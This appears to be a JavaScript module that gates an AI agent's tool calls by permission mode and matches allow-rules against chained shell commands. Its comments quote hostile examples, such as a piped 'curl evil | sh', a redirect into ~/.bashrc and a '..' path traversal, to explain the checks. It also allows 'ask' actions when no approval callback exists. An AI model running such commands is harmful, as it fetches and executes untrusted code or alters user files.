// permission-gate.js — permission enforcement for the completion path (loop engine).
//
// Native CLIs map the permissionMode themselves (Claude --permission-mode, Codex sandbox). The engine must enforce it
// itself BEFORE every tool execution. For "ask"/"auto-edit" it uses the same approval mechanism as Claude: a callback
// requestPermission(...) that runs/permissions.js provides (runs/do-run.js passes it in) and that fulfils exactly the
// /permission-request contract ({behavior:"allow",updatedInput} | {behavior:"deny",message}).
// → the frontend (PermissionPrompt.tsx) stays unchanged.

// Risk class of a tool. Together with the mode it determines the decision.
const TOOL_RISK = {
  Read: "read", Glob: "read", Grep: "read", TodoWrite: "read",
  Write: "write", Edit: "write", MultiEdit: "write", NotebookEdit: "write",
  Bash: "exec", Monitor: "exec",
  BashOutput: "read",  // only reads the output of a shell already started
  KillShell: "read",   // only ends a background shell we started
  TaskStop: "read",    // only ends a monitor of this chat run
  ScheduleWakeup: "read", // only plans a continuation of THIS run (also useful in plan mode)
  ToolSearch: "read",  // only loads tool schemas
  ListMcpResources: "read", ReadMcpResource: "read", SlashCommand: "read",
  // Network access: a fetch carries data OUT (address, search term), it is a leak path — so it asks in "ask" and in
  // plan mode, as both CLIs do for WebFetch/WebSearch.
  WebFetch: "net", WebSearch: "net",
  ExitPlanMode: "read", // triggers the plan approval (the engine enforces the question separately)
  Task: "read",   // subagent: the CHILD tools are gated in turn
};

const READ_MCP = new Set([
  "mcp__cbase__cbase_ask",
  // Loading a guide is reading — from the stock the user maintains themselves. As "external" an approval card would
  // come before every skill.
  "mcp__cbase__cbase_skill",
  "mcp__cbase__cbase_screenshot",
  "mcp__cbase__cbase_recording_start",
  "mcp__cbase__cbase_recording_stop",
  // The agenda is the plan of the OWN chat: reading is reading, and writing is surface like the question card — the
  // system prompt demands checking it off continuously, and in plan mode recording the plan is the point. As
  // "external" it would be forbidden there and in "ask" a card would come before every check-off; the Claude CLI
  // (`--allowedTools mcp__cbase`) never asks. Who may write is decided by the server.
  "mcp__cbase__cbase_agenda",
  "mcp__cbase__cbase_agenda_write",
  // The agenda maintainer: its run has no human — as "external" the loop engine would ask in mode "default" and
  // reject without a card, the maintainer could never write via a third-party provider. Who may write is decided by
  // the server (agenda/upkeep.js).
  "mcp__cbase__cbase_agenda_maintain",
  // Writing skills: the tool is there and never asks — in every mode. Deletion only goes through a request the human
  // decides at its card anyway; who may write is decided by the server.
  "mcp__cbase__cbase_skill_write",
  // The timeline agent: its run has no human — as "external" the loop engine would reject without a card in mode
  // "default" (as with the agenda maintainer). Who may write is decided by the server.
  "mcp__cbase__cbase_timeline",
  "mcp__cbase__cbase_timeline_write",
]);

export function riskOf(toolName) {
  if (TOOL_RISK[toolName]) return TOOL_RISK[toolName];
  // The question card is not an action but surface: it asks the user a question. Treated as "external" it would be
  // FORBIDDEN in plan mode — exactly where questions are the point — and in "ask"/"auto-edit" an approval card would
  // come before every question. The same holds for the capture tools: screenshot/recording only observe the OWN chat
  // browser (also useful in plan mode); showing in the chat is done by the turn end, it is surface like the question card.
  if (READ_MCP.has(toolName)) return "read";
  if (typeof toolName === "string" && toolName.startsWith("mcp__")) return "external";
  return "exec"; // unknown → conservatively treat as executing.
}

/**
 * Base decision without asking. → "allow" | "deny" | "ask".
 * Mirrors PERM_MODES (ChatPane.tsx) / the Codex sandbox mapping:
 *   bypassPermissions → everything allowed
 *   plan              → read only; network access asks (like the CLI — research belongs to planning)
 *   acceptEdits       → read + write automatically, exec/external/network ask
 *   default ("ask")   → read only automatically, everything else asks
 */
export function gateDecision(mode, risk) {
  switch (mode) {
    case "bypassPermissions": return "allow";
    case "plan": return risk === "read" ? "allow" : risk === "net" ? "ask" : "deny";
    case "acceptEdits": return (risk === "read" || risk === "write") ? "allow" : "ask";
    case "default": return risk === "read" ? "allow" : "ask";
    default: return risk === "read" ? "allow" : "ask";
  }
}

// ── Rules "Tool" / "Tool(pattern)" (syntax as in Claude Code's settings.json) ────
// Without such rules the approval card only knows "yes, once" — every repetition of the same harmless command would
// ask again. The pattern checks the tool's MAIN ARGUMENT:
//   Bash(git status)      exact        Bash(git commit:*)   prefix (Claude Code spelling)
//   Bash(npm run *)       wildcard     Read(src/**)         path glob
const PRIMARY_ARG = ["command", "file_path", "path", "url", "query", "pattern", "notebook_path", "name"];

/** The argument a pattern refers to (empty if the tool has none). */
export function primaryArg(input) {
  if (!input || typeof input !== "object") return "";
  for (const k of PRIMARY_ARG) if (typeof input[k] === "string" && input[k]) return input[k];
  return "";
}

function patternToRegExp(pattern) {
  // "…:*" = prefix rule (everything that begins like this) — otherwise a glob with * and **.
  const prefix = pattern.endsWith(":*");
  const body = prefix ? pattern.slice(0, -2) : pattern;
  let re = "";
  for (let i = 0; i < body.length; i++) {
    const c = body[i];
    if (c === "*") { if (body[i + 1] === "*") { re += ".*"; i++; } else re += "[^/]*"; }
    else if (c === "?") re += ".";
    else re += c.replace(/[.+^${}()|[\]\\]/g, "\\$&");
  }
  // A prefix ends at a word end in the SHELL sense: `\b` would let `git:*` match "git-evil" and "git.x".
  return new RegExp(prefix ? `^${re}(?=\\s|$)` : `^${re}$`);
}

// A path with a `..` segment leaves every glob that would literally include it (`Write(src/**)` on
// "src/../../home/agent/.bashrc") — a glob never matches it. Applies to paths and to the words of a Bash line.
const WITH_PARENT_SEGMENT = /(^|[\s/=])\.\.(?=[/\s]|$)/;

// The redirections that leave a subchain judgeable: duplicating/closing descriptors and writing to /dev/null.
// Everything else (writing to a file, reading from one, here-docs) is not judgeable — a rule for "echo x" must not
// approve "echo x > ~/.bashrc".
const REDIRECT_ALLOWED = /^>>?(?:&(?:\d+|-)(?![^\s;&|])|\s*\/dev\/null(?![^\s;&|]))/;

/**
 * Splits a shell line at `;` `&&` `||` `|` `&` and line breaks — outside quotes. A remembered rule must match EVERY
 * subchain, as in Claude Code: otherwise `Bash(git status:*)` would also approve "git status; curl evil | sh".
 * @returns {string[]|null} the subchains, or null = not judgeable (command or process substitution, a redirection
 *   other than /dev/null and descriptors, an open quote, ANSI-C quoting `$'…'`, a comment) — then no rule with a
 *   pattern matches.
 */
export function shellSubchains(row) {
  const s = String(row ?? "");
  const parts = [];
  let cur = "";
  let q = null;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (q === "'") { cur += c; if (c === "'") q = null; continue; }
    if (c === "\\") { if (i + 1 >= s.length) return null; cur += c + s[i + 1]; i++; continue; }
    if (c === "`" || (c === "$" && s[i + 1] === "(")) return null; // also in "…": the shell substitutes there
    if (q === '"') { cur += c; if (c === '"') q = null; continue; }
    // Two constructs in which a quote means something else to the shell than to this split: in ANSI-C quoting `$'…'`
    // `\'` does NOT close, and a `#` at a word start begins a comment to the line end in which no quote counts. In
    // both cases the split would take a real separator for part of a string.
    if (c === "$" && s[i + 1] === "'") return null;
    if (c === "#" && (cur === "" || /[\s()]$/.test(cur))) return null;
    if (c === "'" || c === '"') { q = c; cur += c; continue; }
    if ((c === "<" || c === ">") && s[i + 1] === "(") return null; // process substitution
    if (c === "<") return null;
    if (c === ">" || (c === "&" && s[i + 1] === ">")) {
      const from = c === "&" ? i + 1 : i;
      const m = REDIRECT_ALLOWED.exec(s.slice(from));
      if (!m) return null;
      cur += s.slice(i, from + m[0].length);
      i = from + m[0].length - 1;
      continue;
    }
    if (c === ";" || c === "\n" || c === "\r" || c === "&" || c === "|") {
      if ((c === "&" || c === "|") && s[i + 1] === c) i++;
      parts.push(cur);
      cur = "";
      continue;
    }
    cur += c;
  }
  if (q) return null;
  parts.push(cur);
  return parts.map((t) => t.trim()).filter(Boolean);
}

// WebFetch(domain:host) — the Claude CLI's spelling ("WebFetch permissions must use "domain:" prefix").
// `*.example.org` includes the subdomains, not the domain itself.
function hostOf(url) {
  try { return new URL(String(url)).hostname.toLowerCase(); } catch { return ""; }
}
function domainMatches(pattern, host) {
  const d = String(pattern || "").trim().toLowerCase();
  if (!d || !host) return false;
  return d.startsWith("*.") ? host.endsWith(d.slice(1)) && host.length > d.length - 1 : host === d;
}

// Tools whose main argument is a shell line (Monitor: `command` as a shell watch).
const SHELL_TOOLS = new Set(["Bash", "Monitor"]);

/** Does a rule ("Tool" or "Tool(pattern)") match this call? */
export function ruleMatches(rule, toolName, input) {
  const s = String(rule || "").trim();
  if (!s) return false;
  const m = s.match(/^([^(]+)\((.*)\)$/);
  const tool = (m ? m[1] : s).trim();
  if (tool !== toolName && tool !== "*") return false;
  if (!m) return true; // whole tool approved
  const arg = primaryArg(input);
  if (!arg) return false;
  const pattern = m[2].trim();
  if (toolName === "WebFetch" && pattern.startsWith("domain:")) return domainMatches(pattern.slice("domain:".length), hostOf(arg));
  const withPattern = pattern.endsWith(":*") || /[*?]/.test(pattern);
  // A rule WITHOUT a pattern compares the whole wording — also a chained line that was approved exactly like that.
  if (!withPattern) return pattern === arg;
  let re;
  try { re = patternToRegExp(pattern); } catch { return false; }
  const glob = /[*?]/.test(pattern.endsWith(":*") ? pattern.slice(0, -2) : pattern);
  const matches = (t) => re.test(t) && !(glob && WITH_PARENT_SEGMENT.test(t));
  if (!SHELL_TOOLS.has(toolName)) return matches(arg);
  const parts = shellSubchains(arg);
  return Boolean(parts && parts.length) && parts.every(matches);
}

/** Suggestion for "do not ask again": the narrowest sensible rule for this call. */
export function suggestRule(toolName, input) {
  const arg = primaryArg(input);
  if (!arg) return toolName;
  if (SHELL_TOOLS.has(toolName)) {
    // The first two words as a prefix ("git commit:*") — as Claude Code suggests it. Only for ONE simple command: for
    // a chained line that would mean "cd /ws/proj:*" for "cd /ws/proj && npm test" — a rule for everything behind the
    // cd. Then it stays the exact line.
    const parts = shellSubchains(arg);
    const words = arg.trim().split(/\s+/).slice(0, 2).join(" ");
    if (parts && parts.length === 1 && parts[0] === arg.trim() && !/["'\\*?<>&|;`$]/.test(words)) return `${toolName}(${words}:*)`;
    return `${toolName}(${arg})`;
  }
  // A fetch is remembered for its DOMAIN, in the CLI's spelling.
  if (toolName === "WebFetch" && hostOf(arg)) return `WebFetch(domain:${hostOf(arg)})`;
  return `${toolName}(${arg})`;
}

/**
 * Enforces the permission for a tool call.
 * @param {Object} p
 * @param {string} p.toolName
 * @param {Object} p.input
 * @param {string} p.mode                permissionMode
 * @param {string} [p.toolUseId]
 * @param {string[]} [p.allowRules]      permanent approvals ("Tool" / "Tool(pattern)")
 * @param {(rule:string)=>void} [p.rememberRule]  remembers a rule from "do not ask again"
 * @param {(a:{toolName:string,input:Object,toolUseId:string|null})=>Promise<{behavior:string,updatedInput?:Object,message?:string,remember?:string}>} [p.requestPermission]
 * @returns {Promise<{allow:boolean, input?:Object, message?:string}>}
 */
export async function enforce({ toolName, input, mode, toolUseId = null, requestPermission, allowRules = [], rememberRule }) {
  const risk = riskOf(toolName);
  const decision = gateDecision(mode, risk);
  if (decision === "allow") return { allow: true, input };
  if (decision === "deny") return { allow: false, message: `Not allowed in "${mode}" mode: ${toolName}` };
  // decision === "ask" — check the permanent approvals first.
  if (allowRules.some((r) => ruleMatches(r, toolName, input))) return { allow: true, input };
  if (typeof requestPermission !== "function") return { allow: true, input }; // do not block without a callback
  let dec;
  try { dec = await requestPermission({ toolName, input, toolUseId }); }
  catch (e) { return { allow: false, message: `Approval failed: ${e?.message || e}` }; }
  if (dec && dec.behavior === "allow") {
    if (dec.remember && typeof rememberRule === "function") { try { rememberRule(String(dec.remember)); } catch { /* remembering must never disturb the run */ } }
    return { allow: true, input: dec.updatedInput ?? input };
  }
  // The user's reason belongs TO THE MODEL: otherwise a rejected command could not be told from a broken one, and
  // the same thing would be tried again right away.
  return { allow: false, message: (dec && dec.message) || "Rejected by the user" };
}
